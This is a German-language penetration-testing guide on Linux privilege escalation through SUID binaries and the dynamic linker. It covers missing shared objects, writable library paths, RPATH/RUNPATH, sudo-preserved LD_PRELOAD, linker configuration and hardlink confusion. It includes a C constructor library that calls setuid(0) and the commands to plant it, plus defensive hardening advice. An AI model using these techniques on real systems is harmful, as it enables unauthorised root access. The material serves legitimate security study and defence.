# Missbrauch von SUID Shared Libraries und des Linkers

{{#include ../../banners/hacktricks-training.md}}

SUID-Binaries werden normalerweise auf direkte command execution überprüft, aber benutzerdefinierte SUID-Programme können auch über den dynamic linker verwundbar sein. Das gemeinsame Muster ist einfach: Eine privilegierte ausführbare Datei lädt Code aus einem Pfad oder einer Konfiguration, die ein Benutzer mit geringeren Berechtigungen beeinflussen kann.

Diese Seite konzentriert sich auf allgemeine technique patterns: fehlende Libraries, beschreibbare Library-Verzeichnisse, `RPATH`/`RUNPATH`, `LD_PRELOAD` über sudo, die Linker-Konfiguration und SUID-Hardlink-Verwechslungen.

## Schnelle Enumeration

Beginne damit, ungewöhnliche SUID-Dateien zu finden und zu prüfen, ob sie dynamisch gelinkt sind:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Konzentriere dich auf nicht standardmäßige Speicherorte, benutzerdefinierte Anwendungspfade, Binärdateien im Besitz von root außerhalb paketverwalteter Verzeichnisse sowie aus beschreibbaren Verzeichnissen geladene Abhängigkeiten.

Nützliche Prüfungen auf Schreibbarkeit:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Injection fehlender Shared Objects

Einige benutzerdefinierte SUID-Binärdateien versuchen, ein Shared Object zu laden, das nicht existiert. Wenn sich der fehlende Pfad unter einem vom Angreifer kontrollierten Verzeichnis befindet, lädt die Binärdatei möglicherweise vom Angreifer bereitgestellten Code als effektiver Benutzer.

Fehlgeschlagene Library-Lookups finden:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Wenn die Binärdatei in einem beschreibbaren Pfad nach `libexample.so` sucht, kann eine minimale Proof-Library einen Constructor verwenden. Halten Sie den Wirkungsnachweis während der Validierung harmlos:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Erstelle es mit dem exakten Dateinamen, den die Binärdatei zu laden versucht:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Die ausnutzbare Bedingung ist nicht allein die fehlende Bibliothek. Der Angreifer muss in der Lage sein, ein kompatibles Shared Object an einem Pfad abzulegen, den der privilegierte Loader akzeptiert.

## Beschreibbares Bibliotheksverzeichnis

Manchmal sind alle Abhängigkeiten vorhanden, aber eines der für ihre Auflösung verwendeten Verzeichnisse ist beschreibbar. Dadurch kann eine geladene Bibliothek ersetzt oder eine Bibliothek mit höherer Priorität und demselben Namen platziert werden.

Überprüfe die Abhängigkeitspfade:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Wenn das Verzeichnis beschreibbar ist, validiere dies in einer Laborumgebung mit einem kopiersicheren Ansatz. Das Ersetzen von Systembibliotheken auf einem aktiven Host kann die Authentifizierung, die Paketverwaltung oder bootkritische Dienste beeinträchtigen.

## RPATH und RUNPATH

`RPATH` und `RUNPATH` sind Einträge im dynamischen Abschnitt, die dem Loader mitteilen, wo nach Bibliotheken gesucht werden soll. Sie sind in SUID-Programmen gefährlich, wenn sie auf Verzeichnisse zeigen, die ein Angreifer beschreiben kann.

Ermitteln:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Beispiel für eine riskante Ausgabe:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Wenn `/opt/app/lib` beschreibbar ist und die Binary `libcustom.so` benötigt, kann der Angreifer möglicherweise eine bösartige `libcustom.so` dort ablegen:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` und `RUNPATH` sind hinsichtlich aller Auflösungsdetails nicht identisch, aber bei der Prüfung auf Privilege Escalation ist die praktische Frage dieselbe: Durchsucht das SUID-Binary ein für den Angreifer beschreibbares Verzeichnis nach einem Library-Namen?

## LD_PRELOAD, LD_LIBRARY_PATH und SUID

Bei normalen Programmen können `LD_PRELOAD` und `LD_LIBRARY_PATH` das Laden gemeinsamer Objekte erzwingen oder beeinflussen. Bei SUID-Programmen wechselt der dynamische Loader normalerweise in den Secure-Execution-Modus und ignoriert gefährliche Umgebungsvariablen.

Das bedeutet, dass ein einfaches SUID-Binary normalerweise nicht allein deshalb verwundbar ist, weil der Benutzer `LD_PRELOAD` setzen kann:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Die häufige Ausnahme ist eine Fehlkonfiguration von sudo. Wenn `sudo -l` zeigt, dass eine Variable wie `LD_PRELOAD` oder `LD_LIBRARY_PATH` beibehalten wird, kann ein durch sudo erlaubter Befehl vom Angreifer kontrollierten Code laden:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Verwechsle diese Fälle nicht:

- `LD_PRELOAD` gegenüber einem normalen SUID-Binary: wird durch secure execution normalerweise blockiert.
- Durch sudo beibehaltenes `LD_PRELOAD`: potenziell ausnutzbar.
- Fehlende `.so` in einem schreibbaren Pfad: ausnutzbar, wenn das SUID-Binary diesen Pfad auf natürliche Weise lädt.
- `RPATH`/`RUNPATH` zu einem schreibbaren Verzeichnis: ausnutzbar, wenn eine benötigte Library kontrolliert werden kann.
- Schreibzugriff auf `/etc/ld.so.preload` oder die Linker-Konfiguration: systemweit und mit hoher Auswirkung.

## Linker Configuration

Der dynamic linker liest außerdem Systemkonfigurationen wie `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, den Linker-Cache und in manchen Fällen `/etc/ld.so.preload`.

Wichtige Prüfungen:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Eine beschreibbare Linker-Konfiguration ist normalerweise schwerwiegender als ein einzelnes anfälliges SUID-Binary, da sie viele dynamisch gelinkte Prozesse betreffen kann. `/etc/ld.so.preload` ist besonders gefährlich, weil dadurch ein Shared Object in privilegierte Prozesse geladen werden kann.

## SUID Hardlink Confusion

Hardlinks können dafür sorgen, dass derselbe SUID-Inode unter mehreren Namen erscheint. Dies ist nützlich, um einen privilegierten Helper zu verstecken, die Bereinigung zu verwirren oder eine naive pfadbasierte Überprüfung zu umgehen.

Finde SUID-Dateien mit mehr als einem Link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Untersuche alle Pfade zum selben Inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Der Missbrauch besteht nicht darin, dass ein Hardlink Berechtigungen ändert. Der Missbrauch besteht in der Pfadverwechslung: Ein privilegierter Inode kann über einen Namen erreichbar sein, den Verteidiger oder Skripte nicht erwarten. Weitere Informationen zum Inode- und Hardlink-Workflow finden Sie unter [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Hinweise

- Halten Sie SUID-Binaries möglichst minimal, geprüft und paketverwaltet.
- Vermeiden Sie `RPATH`-/`RUNPATH`-Einträge, die auf beschreibbare oder von Anwendungen verwaltete Verzeichnisse verweisen.
- Halten Sie Bibliotheksverzeichnisse im Besitz von root und für reguläre Benutzer nicht beschreibbar.
- Bewahren Sie `LD_PRELOAD`, `LD_LIBRARY_PATH` oder ähnliche Loader-Variablen nicht über sudo hinweg auf.
- Überwachen Sie `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` und unerwartete SUID-Dateien.
- Überprüfen Sie hardgelinkte SUID-Dateien und untersuchen Sie benutzerdefinierte SUID-Wrapper außerhalb standardmäßiger Systempfade.

{{#include ../../banners/hacktricks-training.md}}
